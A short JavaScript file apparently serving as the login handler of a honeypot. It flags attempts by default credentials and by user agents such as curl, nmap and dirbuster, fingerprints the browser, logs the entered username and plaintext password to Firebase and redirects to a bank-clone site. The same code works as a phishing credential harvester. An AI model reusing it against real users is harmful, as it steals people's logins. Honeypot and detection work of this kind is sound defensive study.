// detect.js
import { pushLog } from './firebase.js';

const badUsernames = ["admin", "root", "test"];
const badPasswords = ["123456", "admin", "password", "root"];
const badAgents = ["curl", "python", "dirbuster", "nmap"];
let attempts = JSON.parse(localStorage.getItem("login_attempts") || "0");

window.handleLogin = function () {
  const attackerIP = localStorage.getItem("attacker_ip") || "unknown";
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const userAgent = navigator.userAgent.toLowerCase();

  const isSuspicious = badUsernames.includes(username.toLowerCase()) ||
                       badPasswords.includes(password.toLowerCase()) ||
                       badAgents.some(agent => userAgent.includes(agent));

  attempts++;
  localStorage.setItem("login_attempts", JSON.stringify(attempts));

  new Fingerprint2().get(function (components) {
    const fingerprint = Fingerprint2.x64hash128(
      components.map(p => p.value).join(), 31
    );

    const payload = {
      ip: attackerIP,
      fingerprint: fingerprint,
      username: username,
      password: password,
      timestamp: new Date().toISOString(),
      isHacker: isSuspicious || attempts > 3,
      event: "Login attempt",
      userAgent: userAgent
    };

    pushLog(payload);
    window.location.href = "https://secure-national-bank-clone.vercel.app";
  });
};
